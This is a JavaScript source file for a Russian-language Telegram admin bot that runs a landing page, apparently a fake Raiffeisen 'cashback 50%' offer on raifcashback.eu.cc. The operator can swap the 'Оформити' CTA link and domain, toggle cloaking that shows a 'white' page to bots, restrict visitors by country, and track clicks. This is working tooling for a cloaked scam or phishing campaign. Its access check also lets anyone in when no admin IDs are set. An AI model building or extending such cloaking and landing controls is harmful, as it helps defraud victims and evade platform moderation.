const { Bot, Keyboard } = require("grammy");
const store = require("./store");
const {
  DEFAULT_SERVER_IP,
  normalizePublicUrl,
  dnsHelpMessage,
  checkDomainLive,
  formatStatus,
  armWatchForUrl,
} = require("./domainWatch");

function parseAdminIds(raw) {
  return String(raw || "")
    .split(/[,\s]+/)
    .map((s) => s.trim())
    .filter(Boolean)
    .map((s) => Number(s))
    .filter((n) => Number.isFinite(n));
}

function isAdmin(ctx, adminIds) {
  const id = ctx.from && ctx.from.id;
  if (!id) return false;
  if (!adminIds.length) return true;
  return adminIds.includes(id);
}

function boolText(v) {
  return v ? "ON" : "OFF";
}

function formatStats(stats) {
  const visits = stats.visits || 0;
  const clicks = stats.clicks || 0;
  const ctr = visits > 0 ? ((clicks / visits) * 100).toFixed(1) : "0.0";
  const today = new Date().toISOString().slice(0, 10);
  const d = (stats.byDay && stats.byDay[today]) || {};

  return [
    "📊 *Статистика*",
    "",
    `👁 Переходы (чёрный): *${visits}*`,
    `🖱 Клики «Оформити»: *${clicks}*`,
    `📈 CTR: *${ctr}%*`,
    `🛡 Белый (боты): *${stats.whiteHits || 0}*`,
    `🌍 Гео-блок: *${stats.geoBlocks || 0}*`,
    "",
    `📅 Сегодня (${today}):`,
    `  переходы: *${d.visits || 0}* · клики: *${d.clicks || 0}*`,
  ].join("\n");
}

function formatConfig(cfg) {
  return [
    "⚙️ *Текущие настройки*",
    "",
    `🔗 CTA: \`${cfg.ctaUrl}\``,
    `🌐 Домен/URL ленда: \`${cfg.publicUrl || "—"}\``,
    `🖥 IP сервера: \`${DEFAULT_SERVER_IP || "не задан (SERVER_PUBLIC_IP)"}\``,
    `🎭 Клоака: *${boolText(cfg.cloakEnabled)}*`,
    `   whiteAction: \`${cfg.whiteAction}\``,
    `🌍 Гео: *${boolText(cfg.geoEnabled)}*`,
    `   страны: \`${(cfg.allowedCountries || []).join(", ")}\``,
    `   fail-open: *${boolText(cfg.geoFailOpen)}*`,
    `🛡 preferUserSafety: *${boolText(cfg.preferUserSafety)}*`,
  ].join("\n");
}

function mainKeyboard() {
  return new Keyboard()
    .text("📊 Статистика")
    .text("⚙️ Настройки")
    .row()
    .text("🔗 Сменить ссылку")
    .text("🌐 Сменить домен")
    .row()
    .text("🛰 Статус домена")
    .text("🎭 Клоака")
    .row()
    .text("🌍 Гео")
    .text("🆘 Помощь")
    .resized()
    .persistent();
}

async function applyDomain(ctx, rawUrl) {
  const url = normalizePublicUrl(rawUrl);
  if (!/^https?:\/\//i.test(url)) {
    await ctx.reply("Нужен URL с http:// или https://");
    return;
  }
  store.updateConfig({ publicUrl: url });
  armWatchForUrl(url);
  await ctx.reply(dnsHelpMessage(url, DEFAULT_SERVER_IP));

  // сразу один чек
  const result = await checkDomainLive(url, DEFAULT_SERVER_IP);
  store.updateDomainWatch({
    lastCheckAt: new Date().toISOString(),
    lastStatus: result,
  });
  await ctx.reply(formatStatus(result, url));
  if (result.live) {
    store.updateDomainWatch({ notifiedLive: true });
  }
}

function createBot(token, adminIds) {
  const bot = new Bot(token);
  const pending = new Map();

  bot.use(async (ctx, next) => {
    if (!ctx.from) return;
    if (!isAdmin(ctx, adminIds)) {
      if (ctx.message) {
        await ctx.reply("Нет доступа. Добавь свой Telegram id в ADMIN_IDS.");
      }
      return;
    }
    await next();
  });

  bot.command("start", async (ctx) => {
    pending.delete(ctx.from.id);
    await ctx.reply(
      "Админка ленда Raif 50%.\nВыбери действие на клавиатуре или /help.",
      { reply_markup: mainKeyboard() }
    );
  });

  bot.command("help", async (ctx) => {
    await ctx.reply(
      [
        "Команды:",
        "/link <url> — ссылка кнопки Оформити",
        "/domain <url> — URL ленда + инструкция DNS + автопроверка",
        "/domain_status — проверить, встал ли домен",
        "/cloak on|off",
        "/geo on|off",
        "/countries UA,PL",
        "/failopen on|off",
        "/white inline|redirect",
        "/stats",
        "/config",
        "/reset_stats",
        "/myid",
      ].join("\n")
    );
  });

  bot.command("myid", async (ctx) => {
    await ctx.reply(`Твой id: \`${ctx.from.id}\``, { parse_mode: "Markdown" });
  });

  bot.command("stats", async (ctx) => {
    await ctx.reply(formatStats(store.getStats()), { parse_mode: "Markdown" });
  });

  bot.command("config", async (ctx) => {
    await ctx.reply(formatConfig(store.getConfig()), { parse_mode: "Markdown" });
  });

  bot.command("link", async (ctx) => {
    const url = (ctx.match || "").trim();
    if (!url) {
      pending.set(ctx.from.id, "link");
      await ctx.reply("Пришли новую ссылку для кнопки «Оформити»:");
      return;
    }
    if (!/^https?:\/\//i.test(url)) {
      await ctx.reply("Нужен URL с http:// или https://");
      return;
    }
    store.updateConfig({ ctaUrl: url });
    await ctx.reply(`Готово. CTA:\n${url}`);
  });

  bot.command("domain", async (ctx) => {
    const url = (ctx.match || "").trim();
    if (!url) {
      pending.set(ctx.from.id, "domain");
      await ctx.reply(
        `Пришли URL ленда, например:\nhttps://raifcashback.eu.cc/\n\nIP сервера для DNS: ${DEFAULT_SERVER_IP}`
      );
      return;
    }
    await applyDomain(ctx, url);
  });

  bot.command("domain_status", async (ctx) => {
    const cfg = store.getConfig();
    const url = cfg.publicUrl;
    if (!url) {
      await ctx.reply("Домен ещё не задан. Жми «🌐 Сменить домен».");
      return;
    }
    await ctx.reply("Проверяю…");
    const result = await checkDomainLive(url, DEFAULT_SERVER_IP);
    store.updateDomainWatch({
      enabled: true,
      url: normalizePublicUrl(url),
      lastCheckAt: new Date().toISOString(),
      lastStatus: result,
      notifiedLive: result.live ? true : store.getDomainWatch().notifiedLive,
    });
    await ctx.reply(formatStatus(result, normalizePublicUrl(url)));
  });

  bot.command("cloak", async (ctx) => {
    const v = String(ctx.match || "").trim().toLowerCase();
    if (v !== "on" && v !== "off") {
      await ctx.reply("Используй: /cloak on или /cloak off");
      return;
    }
    store.updateConfig({ cloakEnabled: v === "on" });
    await ctx.reply(`Клоака: ${v.toUpperCase()}`);
  });

  bot.command("geo", async (ctx) => {
    const v = String(ctx.match || "").trim().toLowerCase();
    if (v !== "on" && v !== "off") {
      await ctx.reply("Используй: /geo on или /geo off");
      return;
    }
    store.updateConfig({ geoEnabled: v === "on" });
    await ctx.reply(`Гео: ${v.toUpperCase()}`);
  });

  bot.command("failopen", async (ctx) => {
    const v = String(ctx.match || "").trim().toLowerCase();
    if (v !== "on" && v !== "off") {
      await ctx.reply("Используй: /failopen on или /failopen off");
      return;
    }
    store.updateConfig({ geoFailOpen: v === "on" });
    await ctx.reply(`Geo fail-open: ${v.toUpperCase()}`);
  });

  bot.command("countries", async (ctx) => {
    const raw = String(ctx.match || "").trim();
    if (!raw) {
      await ctx.reply("Пример: /countries UA\nили /countries UA,PL");
      return;
    }
    const list = raw
      .split(/[,\s]+/)
      .map((s) => s.trim().toUpperCase())
      .filter((s) => /^[A-Z]{2}$/.test(s));
    if (!list.length) {
      await ctx.reply("Не вижу валидных ISO-кодов стран.");
      return;
    }
    store.updateConfig({ allowedCountries: list });
    await ctx.reply(`Страны: ${list.join(", ")}`);
  });

  bot.command("white", async (ctx) => {
    const v = String(ctx.match || "").trim().toLowerCase();
    if (v !== "inline" && v !== "redirect") {
      await ctx.reply("Используй: /white inline или /white redirect");
      return;
    }
    store.updateConfig({ whiteAction: v });
    await ctx.reply(`White action: ${v}`);
  });

  bot.command("reset_stats", async (ctx) => {
    store.resetStats();
    await ctx.reply("Счётчики обнулены.");
  });

  bot.on("message:text", async (ctx) => {
    const text = ctx.message.text.trim();
    const action = pending.get(ctx.from.id);

    if (action === "link") {
      pending.delete(ctx.from.id);
      if (!/^https?:\/\//i.test(text)) {
        await ctx.reply("Нужен URL с http:// или https://");
        return;
      }
      store.updateConfig({ ctaUrl: text });
      await ctx.reply(`CTA обновлён:\n${text}`);
      return;
    }

    if (action === "domain") {
      pending.delete(ctx.from.id);
      await applyDomain(ctx, text);
      return;
    }

    if (text === "📊 Статистика" || text === "Статистика") {
      await ctx.reply(formatStats(store.getStats()), { parse_mode: "Markdown" });
      return;
    }
    if (text === "⚙️ Настройки" || text === "Настройки") {
      await ctx.reply(formatConfig(store.getConfig()), { parse_mode: "Markdown" });
      return;
    }
    if (text === "🔗 Сменить ссылку" || text === "Сменить ссылку") {
      pending.set(ctx.from.id, "link");
      await ctx.reply("Пришли новую ссылку для «Оформити»:");
      return;
    }
    if (text === "🌐 Сменить домен" || text === "Сменить домен") {
      pending.set(ctx.from.id, "domain");
      await ctx.reply(
        `Пришли URL ленда (https://...)\nIP для DNS: ${DEFAULT_SERVER_IP}`
      );
      return;
    }
    if (text === "🛰 Статус домена" || text === "Статус домена") {
      const cfg = store.getConfig();
      if (!cfg.publicUrl) {
        await ctx.reply("Домен ещё не задан. Жми «🌐 Сменить домен».");
        return;
      }
      await ctx.reply("Проверяю…");
      const result = await checkDomainLive(cfg.publicUrl, DEFAULT_SERVER_IP);
      store.updateDomainWatch({
        enabled: true,
        url: normalizePublicUrl(cfg.publicUrl),
        lastCheckAt: new Date().toISOString(),
        lastStatus: result,
      });
      await ctx.reply(formatStatus(result, normalizePublicUrl(cfg.publicUrl)));
      return;
    }
    if (text === "🎭 Клоака" || text === "Клоака") {
      const cfg = store.getConfig();
      const next = !cfg.cloakEnabled;
      store.updateConfig({ cloakEnabled: next });
      await ctx.reply(`Клоака: ${boolText(next)}`);
      return;
    }
    if (text === "🌍 Гео" || text === "Гео") {
      const cfg = store.getConfig();
      const next = !cfg.geoEnabled;
      store.updateConfig({ geoEnabled: next });
      await ctx.reply(`Гео: ${boolText(next)}`);
      return;
    }
    if (text === "🆘 Помощь" || text === "Помощь") {
      await ctx.reply("Смотри /help");
    }
  });

  return bot;
}

module.exports = { createBot, parseAdminIds };
